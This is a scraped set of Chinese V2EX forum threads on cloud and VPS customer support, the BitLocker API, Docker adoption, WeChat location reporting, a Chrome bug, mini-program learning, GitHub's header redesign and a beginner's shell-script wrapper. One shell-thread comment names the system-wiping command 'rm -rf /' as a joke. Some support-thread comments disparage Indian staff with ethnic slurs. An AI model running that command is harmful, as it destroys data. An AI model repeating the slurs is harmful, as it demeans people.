的国内客服，一个外国人接的，说不知者就不收费你费了，把多开的服务器关了就行。。。态度和效率好的惊人", "ssdnodes 暂时感觉不错，有时没问题它也会发邮件问你需不需要帮忙。。。邮件很多时候是秒回。。。", " \r", " \r", " 你们确定问的是涉及到 BGP 这一块的吗？", " 你这个说的太笼统了... 自己买 vps 开飞机多年,好的见过一些,坏的更有不少.", "你去试试 linode 的客服支持，效率超级无敌非常高，而且专业。", "同感， 2.1 我在 ", " 买了一个.io 域名，正好撞上当天他们支付系统出错，支付宝支付完成后，订单被砍了，域名没开通，钱也丢了。我给他们发邮件，后来又给中间支付公司 Global Collect 发邮件，前前后后搞了七天，到 2.8 钱才退回来……", " 我是做 BGP\r", " 请问除了 Vultr 谁还给你做 BGP 的。。。我这个应该不算常规类型的吧，不过问题真的是很简单，只需要改几个数字就等了这么久", "刚刚看了下，光和 gandi 来回邮件往返就有 24 封", "试试 ramnode ，说秒回工单可能差点但是基本上也就是几分钟。。", "![]( ", ")\r", "\r", "这个价格太.....", "![]( ", ")", "<img src = '", "' />", "同样是法国佬， online 回复就快， OVH 那货完全看心情，几个月不回都正常。", "好吧,我放弃贴图了", " 特殊需求，目前只有 Vultr 能做", " 支持 TCP fast open 和 mptcp 么", " 帮你贴了\r", "\r", " ", " ", "题主的炮开得太大了。我和 apple us 以及 cisco us 的客服都邮件沟通过，排除时差因素，相应速度都挺快的。客服都比较专业，礼貌之类基本的就不用说了，关键是即使不是客服本人能解决的问题，也会一直 follow 这个 ticket ，直到帮你解决问题，最后需要你回复解决了问题才会 close ticket 。\r", "印象中客服系统做得最好的是 paypal ，很高效、专业。", "我昨天收到一个 JD 的退款短信，疑惑了好久，因为最近一个月我没有退过货啊。后来一查订单号，是 2015 年 12 月的。突然有天上掉钱的喜悦", " vultr 要刷新 radb 然后运营商根据 radb 刷新前缀 这个前缀才会被接受", "体验过 airbnb 客服 是个外国妹纸 但是中文交流完全没有问题 商旅账户收不到邮件 打电话确认后 直接在后台操作下过了验证…", " 哈哈哈哈哈，还真是！不过退款还是挺快的。两三天吧，一般都是这么久的吧。。", "来用我们腾讯云吧，客服响应超级快的。", "就感觉特么阿里云的客服一次比一次慢", "阿里：全靠同行衬托", "这么说吧  慢慢下去啊 中国又要回到世界第一大国的位置", "主要是时差的问题", "客服基本都是阿三", " 国内的 XX 那个只能叫大号 VPS ，连资源池功能都不能实现。。。", " No ，我问题是出在 ASN 给我写错了，写了一个代播的 ASN 而不是我们自己的。为了修改这几个数字花了一天。。。", "反正我的 vultr ticket 都是半个小时内就有回复。", " 不给玩 BGP ，你宣告什么呢？", "之前在 namecheap 买过 ssl 证书，客服回复挺快的，即时聊天\r", "我有几分钟没回复，他还跟我说他在等\r", "感觉蛮好的", "linode 的 ticket 回复很快", "国外客服烂很正常，都是外包给阿三的\r", "那一股咖喱味的英语……", "所以你们知道了 国内还是有很大的优势的   对人工的压榨 简直了  在外国人看来完全不可理解\r", "国内习惯了这种对人力压榨的结果    到其他地方去 绝对不习惯", "跟阿里的客服一个德行。", " .....跟 RIPE 没关系 你有 route-object 服务商可以自动生成 prefix-set", " 其实是 APNIC 后台那个设置貌似有点问题，设置 route-object 要发邮件才能改，自己没法改。 APNIC 的回复是因为是新的 LIR 什么的，防止转租，一年之后就能自己改。\r", "然后 route-object 不是强制需要的，因此没设置直接给的 LOA", "好比老外半夜给国内网站下了个单,大半夜谁不睡觉,除非有 24 小时客服", " 我是从她们的时区 7:52 提交的，一直等到 16:55 都没人理我！跟时区有什么关系？", "打电话就很快", "证明是真正美国人在服务你， 那些服务块 售后好的公司都是全套印度客服 24X7 及时回复", "还是金山云售后好,我公司就买了几台服务器还组了个 QQ 群,里面各种金山的技术,各种问题基本是 1 分钟响应", "客服我只佩服 paypal 不光响应快，还跟你攀亲戚，一言不合就是送你美金，虽然是羊毛", "体量小的时候 很多公司都能把客服做好。体量上去以后，就很难保证客服质量了。\r", "\r", "aws 是把客服资源倾向于购买了客服服务的用户，普通用户的工单 1-3 天内有响应就不错了。\r", "至于阿里云，大家猜猜那个用户等级有什么用？", " 邮件用 maintainer object 的密码就可以自动改嘛", "OVH 是我见过的 infrastructure 最透明的公司 内部的工单系统是任何人可见的 ", "还是百度云好, 响应快, 而且基本没啥问题", " online 也是 \r", "国外不靠谱的公司一样很多，有实力还是自己管理比较好。\r", "\r", "公司以前用一家法国的公司（ NBS ）管理 2 个项目，甭管多小的改动，等 2 星期都是稀松平常。\r", "今年老板终于受不了了，决定把那 2 个项目拿回来自己管。目前正在准备迁移手续。\r", "我们公司其他的项目用 AWS ， 3 年没有出过任何问题（ EU Ireland: eu-west-1 ）", " 腾讯云提交工单响应是快，但是客服水平和阿里云水平相当，说多了都是泪呀", " 这里的语境应该是未付费购买售后服务吧，一般也没有这样的消费习惯，买了东西之后还的买售后。付费买服务和大客户自然是另说啦。", "国外的客服就是这样，主要因为国外人工贵，不知道是客服少还是大家都是拿钱不干活或者干少的缘故。\r", "\r", "不过说道 VPS 云服务商的客服想到了 DigitalOcean 的，回复速度和你们用钱的基本成正比，我们公司的 DO 客服回复速度就要比我自己的帐号快好多", "美国人为什么比中国人有钱，因为中国人都在睡觉的时候美国人却在努力工作----李嘉诚", " 擦！", " 哈？", "在国外呆久了最想的就是国内的各种客服快速响应和快递（包括发货速度）\r", "\r", "这边响应都是 48 小时的，还是太平洋时间（老子东部时间啊 哭瞎）"]},
{"content": ["<div class=\"topic_content\">上网搜了一圈，没找到 Bitlocker 相关的 API 讨论和文档，是微软根本不向开发者开放这个系统组件还是因为我打开搜索引擎的姿势不对？</div>"], "reply": "4", "tittle": "微软有提供 Bitlocker 的 API 开发文档吗", "comment": [" 这些网页我大多数看过，没有一个是真正意义上能用于开发的 API, 许多是外部调用 powershell 或者 WMI 的", "逛了一圈 MSDN Library,又逛了一圈 MSDN Blog, 这里是结论: 微软并没有提供 Bitlocker 面向开发者的 Win32API.\r", " WMI 应该就够用了吧"]},
{"content": ["<div class=\"topic_content\">摘自读者\r<br>\r<br>    林肯的盖茨堡演说稿，写在他从暂时居住的朋友家中借来的普通信纸上。\r<br>    海明威用一支普通的钢笔写作。\r<br>    凡高作画时，调色盘上很少超过六种色彩。\r<br>    总之，你拥有的工具与创造力之间，关系不大。\r<br>    事实上，当一位艺术家在自己的领域钻研得愈熟练时，他愈会知道什么工具用来顺手，愈明了将精力花在物品上太浪费时间。花哨的工具，只是让二流角色多一根藏身的柱子罢了。\r<br>    这就是为什么那么多二流作家使用顶级笔记本电脑。\r<br>    这就是为什么那么多蹩脚摄影师使用顶级数码相机。\r<br>    这就是为什么那么多平庸画家花大钱在闹市区开画室。\r<br>    这些人都是为了藏在柱子后头，但柱子帮不了忙，只会碍事。柱子愈大，人们心理上对它的依赖就愈强，就会造成愈大的阻碍。\r<br>    成功的人——无论是不是艺术家，他们不需要柱子也能干得有声有色。更重要的是，一旦发现这些柱子，他们可以立刻摆脱。\r<br>    然而，我们绝大多数都是普通人，不可能过毫无依赖的生活，我们都有自己的柱子。所以，我们只能针对我们的生意、我们的行业、我们存在的意义等各个层面不断质问自己：“这是根柱子吗？”然后由此继续前进。愈常质问自己，愈懂得如何找出柱子，柱子就愈快消失。\r<br>    质问，不断质问，然后再度质问。一旦停止质问，你就完蛋了！</div>"], "reply": "20", "tittle": "天才与柱子", "comment": ["这个故事很容易矫枉过正然后被误解为「不用 IDE 写代码的都是大神」「为了成为大神我得马上把 IDE 卸载了」", "最后一句话，将文题拉了回来", " 我觉得这些都是“度”吧，顺手就好", " \r", "\r", "> 将精力花在物品上太浪费时间\r", "\r", "感觉这是在说「把精力花在调教 Vim 上太浪费时间，赶紧找个开箱即用的 IDE 」😂", "为什么没有顶级的摄影师用 iPhone 摄影？\r", "不要一概而论，工具是为了更好的满足『自身』即『个体』需求。", "不知道你想说什么……你是说这些柱子是“媚俗”吗？", "第一眼就觉得是朋友圈鸡汤文的文风，再一看，『转自读者』。。。", "> 林肯的盖茨堡演说稿，写在他从暂时居住的朋友家中借来的普通信纸上。 \r", "> 海明威用一支普通的钢笔写作。 \r", "> 凡高作画时，调色盘上很少超过六种色彩。 \r", "\r", "三个例子，浓浓的鸡汤味，\r", "1 ，林肯的盖茨堡演说稿 ", " 只说写在信封背面，而且是市井传说里的\r", "2 ，没找到具体的例子，但是有一段是“欧内斯特·海明威以文笔洗练闻世，其写作往往三易其稿：第一遍用铅笔写，然后用打字机打一遍，最后再改一遍。用铅笔创作的第一稿至关重要，他声称“这 33.3%的命中率对一个击球手来说已经是标准之上了。”那本著名的巴黎回忆录《流动的盛宴》，就是海明威一大早起来，带着两支铅笔、一只转笔刀和一个蓝皮笔记本跑到咖啡馆里写出来的。”\r", "3 ，没找到反驳，也没找到证明的例子。", "恩，读者，没毛病", "工具是随着自己姿势水平的提高自然而然就有了.就像写代码多了就会感觉普通的键盘不好用,入个机械或者 HHKB.手机拍照功能不够用了自然就会想着入个单反.买了顶级装备人就变牛逼了那是 RPG 游戏,不是现实.", "没有最完美，只有最适合，这篇文章说的是创造价值的时候心要放平，珍惜自己拥有的。", "讨论 IDE 的好用与否不比看读者款鸡汤更有意身心健康么？\r", "\r", "1. 林肯的例子好比老毛衣服的补丁\r", "2. 海明威的例子更说明不了问题，要看过《流动的盛宴》就知道当时的海明威可是穷的逛街都得避开有面包店的路因为烤面包的香味让人饿肚子，这种怎么可能想买好点的工具，温饱都没解决。\r", "3. 关于梵高的色彩就不说了，艺术上的选择问题\r", "\r", "比起看读者，我们更该 pk 编辑器", "这就有一个观点，然后后找一堆看似被名人盖章的事填上，让这个观点看似有了权威，这个文章本身就是在躲在柱子后面，真是不知羞耻", "为什么你们这么容易被戳到痛处天啦噜", "这就是为什么那么多蹩脚摄影师使用顶级数码相机。\r", "====>我不知道是从哪里得来的数据\r", "\r", "文章内容有一定道理， 但是无限扩大必定变成“胡说八道”", "幸好我不是天才", "一幅画本身不能用于绘制另一幅画（除了电子的），顶多是画一幅画的经验有助于画另一幅画，你用了工具，积累的经验就少，对于画新的画是是不利的。\r", "\r", "但是计算机不一样，一个工具做出来可以用于开发另一个工具，即工具可以转化为生产力来开发新的工具，这样的话就有 dy = k*y 了，你把这方程解出来就是指数函数，通俗来讲就是爆炸式增长。\r", "\r", "所以不用工具能有今天的信息产业？？做梦去吧。", "and that government of the people, by the people, for the people, shall not perish from the earth. 🐸", "每天早上微信朋友圈都能看到这种心灵砒霜，怎么现在 V2 也有了 [/惊呆了]", "读者的文章 有啥意义啊\r", "真要说，冯诺伊曼 那么喜欢自己名字里的 von 是不是也是追求没必要的工具啊"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>译见系列｜道客船长「译见」系列，关注国外云计算领域的技术和前沿趋势，每周为开发者提供精选译文。</p>\n<p>谁在使用 Docker ? 如果你的公司已经使用了 Docker ，那么你或许会知道答案。但如果你仍然疑惑 Docker 是否适用于企业级市场，那么答案或许会令你感到意外。</p>\n<h1>挑战</h1>\n<p>2013 年 Docker 发布之初，一些人将 Docker 视为一时兴起的技术，认为它只是昙花一现。但自此之后 Docker 技术日渐崛起。截至 2014 年底，容器镜像下载量高达 1 亿；到 2017 年初，<strong>这一数量超过 80 亿。</strong>这样的增长速度是惊人的。</p>\n<p>但是应用全新的技术进行软件开发和部署，对初创公司或小型业务来说是一回事，对颇具规模的企业级操作来说，又是另一回事。是否会有一个合理的时机，需要企业为了使用容器技术而重构现存的软件，同时转向容器技术的实践，从而实现持续交付？</p>\n<h1>用数字说话</h1>\n<p>Docker 最初的发布距今已有四年时间，我们已经有了足够的调查、数据和业界案例来全面充分地展现 Docker 技术在 IT 行业的图景：谁正在使用 Docker ？谁在考虑采用？未来将何去何从？</p>\n<h1>Docker 技术采用率大幅增长</h1>\n<p>Datadog 于 2016 年中期针对客户的一项调查显示，在过去一年， Dcoker 技术的采用率从 2015 年 5 月的 8.2% 增长至 10.7%，增幅为 30%。这些数据大部分代表了 Docker 在生产环境中的应用，而不仅限于开发环境，<strong>因此这些数据可以代表 Docker 的“实质性”采用，而不是简单的“尝试性”使用。</strong></p>\n<p><img alt=\"\" src=\"http://blog.daocloud.io/wp-content/uploads/2017/02/%E9%85%8D%E5%9B%BE-2.png\"></p>\n<p>Datadog 的客户普遍颇具规模，在软件部署方面趋于保守，因此超过 10% 的采用率，其实对于面临诸多企业级限制（包括遗留软件、以往稳固的 IT 实践、对现存基础设施的高度依赖等）的企业来说，已是相当大的投入。</p>\n<p>近期，其他的调查结果同样显示了更高的采用率，例如， Docker 使用率在 2015-2016 年增长了 100%。 Docker CEO Ben Golub 在 2016 DockerCon 的主题演讲中提到，<strong>过去两年的增长量是惊人的，大约有 46 万个应用实现了 Docker 化（相比 2014 年增长了 3100%）。</strong></p>\n<p><img alt=\"\" src=\"http://blog.daocloud.io/wp-content/uploads/2017/02/%E9%85%8D%E5%9B%BE-3.png\"></p>\n<p>New Relic 的报告显示每个账户同时运行的容器的活跃数量，从 2015 年的 96 增长至 2016 年 的 280 ，<strong>这意味着很多用户对 Docker 的使用从开发实践已经转向了生产部署。</strong></p>\n<h1>哪些企业是 Docker 真正的使用者？</h1>\n<p>哪些企业在真正使用 Docker ：初创公司，中小型企业，大型企业？ Datadog 的报告显示，<strong>Docker 的普及实际上是由大型公司（拥有至少 500 台主机）引领的，而非小型的初创公司。</strong></p>\n<p>其他的调查数据也表明：企业级机构的 Docker 使用率要高于各行业的平均水平。 New Relic 的报告显示， 2016 年每个企业容器平均部署量为 28000 ，最多的部署量高达 135638 （ 2015 年为 1596 ）。这些数据有力地表明相当多的企业参与了 Docker 的部署。</p>\n<p><img alt=\"\" src=\"http://mmbiz.qpic.cn/mmbiz_jpg/1DjrTiaica04m8qfGNpp9nHsVs0aAhPjKU7zvQODsICUvHTHLmq3MaiccyhBicia7MGjj3wb1GXzN0DJICfObEJgXbQ/640?wx_fmt=jpeg&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1\"></p>\n<h1>选择 Docker 的原因</h1>\n<p>如果越来越多的企业投入使用 Docker ，那么是什么原因促使他们做出这样的选择？他们又是如何从单体架构应用过渡到基于容器的部署？</p>\n<p>一些开发者、 IT 技术人员，包括一些 Docker 的企业级使用者，近期在 Hacker News 上参与了相关的讨论。<strong>出人意料的是，人们认为 Docker 部署非常简易。</strong></p>\n<p>这场讨论体现了虽然搭建和维护基础平台是项要求高的工作（有时不单是技术上的复杂性，还会反映潜在的组织问题），但在生产环境中部署 Docker 却相对简单可靠。</p>\n<p>据报告，容器每日的部署量高达 15000 （在 Saas 企业，容器部署被视为轻而易举）。</p>\n<h1>Docker 的企业级应用</h1>\n<p>哪些企业级公司在使用 Docker? 他们从中有何收获？这些问题的答案会着实令人惊叹。\n<img alt=\"\" src=\"http://mmbiz.qpic.cn/mmbiz_png/1DjrTiaica04nGB6k34zcIkXP5ZgRjtTjUAs0rnicHR8gDUx4k7ICaiauQceS4ZUd0gzkqxm0EvuGKXpKonKlBQnSQ/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1\"></p>\n<h2>通用电气</h2>\n<p>正如你所料，科技行业早期的领导者难免会有这样一个缺陷：长久累积下来的遗留实践和数据处理体系。对通用电气而言，这一缺陷意味着应用 开发-交付 的周期平均长达六周，还有大量的人工交付环节。</p>\n<p>最初向云迁移时，很多已有的实践仍然未被消除，这样只部分缩短了延迟时间。产生这样的问题，主要是因为通用电气在最初采用的基于云的工具难以使用。</p>\n<p>当通用电气转而使用 Docker ，开发者发现 Docker 操作简便，并能够很快适应。他们围绕 Docker 搭建核心服务，相比虚拟机，实现了更高密度的应用。对于拥有悠久历史的公司来说，重要的是 Docker 让通用电气可以为遗留应用提供支持，极大地加速了从年代久远的 （ 20 世纪中期）遗留数据中心的迁移。</p>\n<p><strong>总而言之， Docker 使遗留体系的转型更快捷、简易、平稳。</strong></p>\n<p><img alt=\"\" src=\"http://blog.daocloud.io/wp-content/uploads/2017/02/%E4%B8%8B%E8%BD%BD.png\"></p>\n<h2>BBC News</h2>\n<p>对 BBC 的新闻部门来说，速度和容量是很大的问题。 BBC News 以大约 30 种语言发布广播和在线新闻，仅英语新闻每天就超过 8 万条。在 10 个不同且难以修改的持续集成环境中，依照顺序运行 26000 项任务，这导致长期的拥挤和叠加等待，每项任务运行时间长达 60 分钟。</p>\n<p>Docker 让 BBC News 缩减了任务等待时间，并且可以并行运行任务。它也为开发者提供了更灵活的持续集成环境，更容易使用，也增强了应用架构等因素的可控性。</p>\n<p><img alt=\"\" src=\"http://mmbiz.qpic.cn/mmbiz_png/1DjrTiaica04nGB6k34zcIkXP5ZgRjtTjU4BkwKydDWEhn3ibs63iaHJpxj2E44iblkgks50kd4t4Mtibh32A4nLcNcA/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1\"></p>\n<h2>Lyft</h2>\n<p>领先的即时用车公司 Lyft 依赖于移动乘车共享应用。但是在最初开发时，应用是单体架构，体量庞大，存在很多开发和维护的问题。 Lyft 在最初向微服务转型时，由于缺少灵活和独立自主的环境，导致效率非常有限。</p>\n<p>当 Lyft 转而使用 Docker 时，开发者可以独立测试和部署特性，同时高效地管理微服务之间的沟通。这使开发和交付变得更快捷高效。 Lyft 现在使用 Docker 来管理持续集成链，同时用 Docker 进行测试。</p>\n<h2>其他机构</h2>\n<p>其他部署 Docker 的公司主要有：商业内幕网 （ Business Insider ）、 Spotify 、 Yelp 、 ADP 、 eBay 、艾派迪（ Expedia ）、 Groupon 、 ING 、 New Relic 、纽约时报（ The New York Times ）、牛津大学出版社（ Oxford University Press ）、 PayPal 、 Sage 、 Shopify 、 The Washington Post （华盛顿邮报）以及 Uber 。</p>\n<h1>Docker 时代已经到来，你准备好了吗？</h1>\n<p>那么，谁在使用 Docker ? 这些成功的案例有力地表明， Docker 的采用和基于生产环境的实践已经发展到了全新的阶段：基于 Docker 交付快捷、使用简单及灵活的特点，知名和保守的企业以及新科技巨头已经将 Docker 视为开发和部署的实用解决方案。</p>\n<p>Docker 时代不仅已经到来，并且它已经成为了企业 IT 战略的决胜关键。</p>\n<h3>作者简介</h3>\n<p>本杰明 · 伍顿（ Benjamin Wootton ）是企业 DevOps 和云迁移咨询公司 Contino 的联合创始人、首席技术官、 EMEA （泛欧中非负责人）。协助十多家企业进行 DevOps 转型，具有实践经验的 DevOps 工程师，专长云计算和容器领域。</p>\n<p><a href=\"http://blog.contino.io/whos-using-docker?mkt_tok=eyJpIjoiTlRZd09EY3paVFF3WlRsaiIsInQiOiJLajRPT2lJNEpzN0ZqandSVnVmcTlrc0FSUVJcL3ppZ0pLK2NOK0FZUVlHTktLcTFIa2IxNXZYVUNrXC9qVzJiN0RSS1ZucENNZFwvR25JQ1wvUVFQZzZJUlRyRGI3K2RlYUJvbkF6bE9DMnpKVjE2cFwvU3dnaWV3WUYyUEVqRjZoV0lHIn0%3D\" rel=\"nofollow\">阅读原文</a></p>\n</div></div>"], "reply": "9", "tittle": "Docker：企业级市场的新趋势", "comment": ["这两天正在玩 docker ，挺有意思的。\r", "\r", "顺便安利一个免费的 docker hosting ，关键词 arukas 。", "给运维的用用就行了，开发人员表示不喜欢 docker 。", " 能表述一下原因吗？", " 兼运维的开发怎么办， 23333333", " 开发表示可喜欢了。", " @", " \r", "纯说开发 Vagrant 还是比 Docker 方便", " 仅公测期间免费哦，估计快结束了。", " 结果运维说因为有", "Docker 公司已经不需要他了。。。", " 开始万觉得新鲜，可以不用配置环境，但是时间长了明明在自己电脑上，非得搞得像在别人电脑上一样。而且配置环境这点时间比起配置管理 docker 和写脚本的时间简直九牛一毛。\r", "\r", "我就喜欢直接撸代码，不愿意再去管理一个虚拟机一样区管理一些乱七八糟的机器。"]},
{"content": ["<div class=\"topic_content\">打车系统正在开发，想利用公众号来做，但是好像不能实现 3 分钟向服务器自动报告位置！</div>"], "reply": "16", "tittle": "公众号可否每 3 分钟向我服务器发送一次坐标经纬度？", "comment": ["are you kidding me ?", "如果用户一直打开着页面，那么使用定位接口应该是可以定时发送的。如果退出了，那就无解了。", " No\r", "\r", " APP 应该可以实现，但是希望通过公众号实现，不知道有没有办法去监控这个事", "类似的功能当然不能用微信来实现", "目前 公众号应该还不行的。。没法实现。。。\r", "基于 im 做打车系统，，这个不错。。。\r", "\r", "而且我记着 国外也有成熟的，，记着之前就有 基于 telegram  开源的。。", "不可以。", " 谢谢\r", " 谢谢，我去看看\r", " 好的。", "你可以做成 html5 ，然后用 js 的 setinterval 和 html5 的定位 api 实现。", "我记得微信里面用滴滴打车可以即时看到司机的位置", "这是要监视用户准备追杀么？", " 司机那端肯定是装了滴滴的 APP 的", "我刚做完一个 是打车的 实时获取用户坐标发送后台", "老老实实做手机 App 吧。\r", "\r", "如果要做成类似智能硬件那种，安装到车上也行，每个设备应该可以一百多的样子拿下。", "微信小程序应该能做到", "\r", "\r", "用户同意上报地理位置后，每次进入公众号会话时，都会在进入时上报地理位置，或在进入会话后每 5 秒上报一次地理位置，公众号可以在公众平台网站中修改以上设置。上报地理位置时，微信会将上报地理位置事件推送到开发者填写的 URL 。", " 谢谢，但是在关屏的情况下，好像无法上报了"]},
{"content": ["<div class=\"topic_content\">非常苦恼，让人难过，在网上竟然找不到类似问题。</div>"], "reply": "9", "tittle": "Chrome 自不知道哪个版本开始，审查元素无法 ctrl + c 复制 class / id 名，有人知道怎么回事吗？", "comment": ["应该是从 55 开始起的 BUG", "目测是 BUG\r", "很难受+1", "windows10 自带中文输入法和 chrome55+有冲突，切英文输入法就好了", " 不是这个问题，我用的是 mac", " cmd + c 也不行", "版本 58.0.3004.3 dev (64-bit)\r", "可以正常复制", " \r", "\r", "试了一下， 58.0.3004.3 dev 版确实正常了，这说明肯定是个 bug 了，延续了很长时间。\r", "现在 56.0.2924.87 stable ，还不正常。", " 那就只有等这版本正式发布了", "版本 56.0.2924.76 (64-bit) 正常可以复制，"]},
{"content": ["<div class=\"topic_content\">平时主要撸 iOS 想在下班时间学点东西 慢慢转小程序开发\r<br>请问大家有什么学习路线建议么？</div>"], "reply": "19", "tittle": "请问从零开发微信小程序的学习路线图是？", "comment": ["谋生的话，小程序当零食，你本来的 iOS 才是主菜。\r", "\r", "先学网页的 js 、 css 吧", " 谢谢回复 请问犀牛书适合入门吗", "虽然现在在做小程序开发...但是劝楼主真的不用认真..小程序应用场景十分有限，开发也很简单，学下 JS 基本语法，对着官方文档写一遍差不多就好了", "对着微信文档就可以开始了…", "微信小程序已经这么火了？", " \r", " \r", "多谢 但没有 js 基础 文档看起来有点吃力 看来得先撸 js \r", "\r", " \r", "最近小程序的活很多 iOS 和安卓的活不多 感觉应该会火一阵把", "先学习 js 啊,然后入门一下 vue.js,在学起小程序来你就会觉得简单多了", "去 w3cschool 上面找，我看到有教程了", "楼上说的对, 小程序只能当零食, 应用场景实在有限, 我感觉发布到现在都已经过火了...\r", "\r", "另一方面小程序的模版语言功能也很弱, 尤其 wxss, 对已经习惯 sass 的人, 写连伪选择器都没有的 css 简直受罪, 专用 IDE 做的也不敢恭维...\r", "\r", "js 就是在原生基础上做的, wxss 是在 css 上阉割的, view 是基本的数据绑定, 学微信小程序, 干脆直接学 web 前端嘛!\r", "\r", "---\r", "\r", "// 2000 元出抽到的 Kindle Oasis", "不学", "同是 iOS 开发，之前也在学小程序开发，在网上买了一个课程看的。", "用了一周仔细撸文档，很快就可以做一个简单的小程序", " js 入门的书或教程 有推荐的吗 谢谢", " 多谢\r", "\r", " 能分享一下啥课程咩？\r", "\r", " 请教一下 小程序适合微商的应用场景吗", "小程序已经消停了吧...", " 看阮一峰老师的教程[JavaScript 标准参考教程]( ", " ES6 标准入门这本书", "参考一下这个帖子： ", " \r", " \r", "多谢多谢", "现在还有人用小程序么？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><img alt=\"\" src=\"http://wx1.sinaimg.cn/mw690/5fee18eegy1fcmdnkzmqoj20ym020t8w.jpg\"></p>\n<p>reddit 讨论贴:</p>\n<ul>\n<li><a href=\"https://www.reddit.com/r/programming/comments/5t9bnd/github_just_changed_the_upper_navbar_to_black/\" rel=\"nofollow\">https://www.reddit.com/r/programming/comments/5t9bnd/github_just_changed_the_upper_navbar_to_black/</a></li>\n</ul>\n</div></div>"], "reply": "39", "tittle": "github top header 变黑了， A/B test 嘛？", "comment": ["GitHub 黑化了", "压抑，不喜欢", "本来早上也想发帖问来着。估计他们觉得黑色比较帅吧", "改 css 变成粉色就好（", "google 输出审美观", "我看已经测试完了…\r", "\r", "感觉挺好看的", "一直有个疑问…… reddit 如何收藏某个 topic ？像贴吧那样", "感觉收到了侵犯。。也许过几天就习惯了。。", " \r", "\r", "不好看 ( 摊手 )", "喜欢黑色，但是下面都是白的感觉很奇怪。", "![]( ", " )\r", "\r", "不要打我，我觉得挺好看", "是有 duckduckgo 的人进了 github 吗？ 。。。。", "我还以为我的 css 渲染炸了", " topc 下面有 save 啊，登陆后就可以保存在你的列表里", " ...黑白灰党表示无法接受这种彩色世界。。", " 黑白灰党是全色彩色盲的意思吗？", " 那倒不是。只是纯粹喜欢简约的颜色，黑色、白色、灰色。。", "感觉极其难看，页面不协调", "还是喜欢白色", "这个「黑」有点过于黑了点。", "大概是手抖了？以前的话是只有 Enterprise 版是黑色", "感觉蛮新鲜,也必僵硬的蓝色好看", "reddit 有个评论有趣 npm publish without dependency", "对比度太强了，不舒服。", "肯定是程序员的锅，  美工干不出这事来", "dark mode", "变成黑色之后看不清按钮了…还是原来好看", "老早之前我就自己改成黑的…", "没有登录时还是正常的", "刚刚才发现，以为是温馨的弄了一个夜间模式的 header", "苹果官网即视感", "喜欢 感觉很酷", "还以为是节日特效，然后使劲想今天是啥节日。。。", "改界面是真的无趣！", "变得跟企业版一样了", "github 访问不到了 之前不翻墙可以访问的", "我还以为就手机端改成了黑色，原来是 A/B 测试~~", "不喜欢的话可以自己 stylish 一下呀", " 把 header 搞成绿色真的好么 →_→"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>假设你有一个脚本名为 <a href=\"http://doSomething.sh\" rel=\"nofollow\">doSomething.sh</a> 接收一个参数</p>\n<p>想要运行它需要</p>\n<pre><code>$ cd /your/script/enclosing/folder\n\n$ ./doSomething.sh arg  或  $ source doSomething.sh arg 或  $ . doSomething.sh arg\n</code></pre>\n<p>运行该脚本后</p>\n<p>只需</p>\n<pre><code>$ doSomething arg\n</code></pre>\n<p>即可。</p>\n<p>GitHub <a href=\"https://github.com/hijerusalem/custom-builtin-commands\" rel=\"nofollow\">https://github.com/hijerusalem/custom-builtin-commands</a></p>\n<p>在 macOS 下可以运行，不知道在 Linux 下能不能运行。如果觉得不错欢迎 star ，有 bug 欢迎 issue</p>\n</div></div>", "<div class=\"topic_content\">一个多月前，我开始准备我的毕业设计。为了简化一些繁琐的流程，我自学了一些 shell 编程的知识。这些脚本大概就是在那时候写的。今天把它放出来，没想到引来这么多人关注😅。正如标题的引号所示，这里的内置并不是真正的内置。大家的回复也让我学到了一些东西，如果还有知识性的补充，欢迎大家继续评论。</div>"], "reply": "40", "tittle": "一个有趣的 shell 脚本。可以将你的 shell 或 Python 脚本变为“内置“命令", "comment": ["环境变量？", "有趣在哪里？", "有趣在哪里？", "………", "我直接有个快捷键 把文件放到$HOME/bin 文件夹中 然后 chmod +x", "ln 到 bin 下就可以了吧", "...", "  差不多。那个脚本包就是把移动文件，更改权限，制作，移除命令流程给简化了。省去一些敲键盘的时间。", " 是的，我就是把一系列过程，给封装了一下。就觉得封装一下比较方便。", "提个建议 源代码里面直接 chmod 777 真的好吗太粗暴了吧", "……", "请告诉我哪里有趣了？", " 请问应该如何修改?", " @", " 这里的有趣是我个人感觉。前段时间，有学一点 shell 编程。在写这个脚本包的时候，融汇了许多我当时新学的知识，所以觉得比较有趣。把他公开出来，也是出于学习目的。", "chmod 777\r", "。。。。。。", "面向 star 编程......", "你高兴就好 ", " ", "这不叫“内置命令”\r", "\r", "`cd` 这种不在 `$PATH` 里的才叫", " 所以我才在标题里加引号。我曾经看过 man cd", "还好，脚本里面没有 rm -rf / \r", "233", "没看到哪里有趣。", " 太暴力了，说的好，还不如 chmod a+x", "看到那个驼峰命名，我就给差评。", "楼主欺负我读书少？ ", " ", " 是楼主读书少。对 shell 编程只知皮毛，来这献丑了😅", "还在想什么黑科技能弄出 shell 内置命令呢", "秀无知，必须差评", "builtin 命令就那几个", "支持一下，加油~", "感觉楼主得考虑换个 ID 才能继续在 V2EX 上混了🐶", "ln -s /path/to/script /use/local/bin/", "哈哈哈哈哈，我以前 sleep 5 && banner cool 都会觉得有趣 ==（好新奇 /novel ），哈哈哈哈哈。想想自己好逗啊 ==", "我觉得 star 这个 repo 的人也会火 ==。", "我在~下有一個 bin 目錄，然後我把~/bin 加到 PATH 變量裡", "哈哈 虽然是最基础的知识，不过大家都是这样过来的 :-)", " 等下我就去 star ，火不了你赔钱", "还是努力提高自己的姿势水平", "这难道不是加个 path 的事吗？", "你呀！ naive!!!", "这………………\r", "我一行能搞定\r", "echo \"alias \\\"$1=$(pwd)/$1\\\" \" >>~/.bashrc\r", "\r", "大概是这个意思，懂得明白个意思就好了\r", "\r", "其实呢，我自己是 PATH 加~/.local/bin\r", "然后常用的一些自己的脚本都在这里面", "楼主还是要学习一个，提高自己的姿势水平。"]},
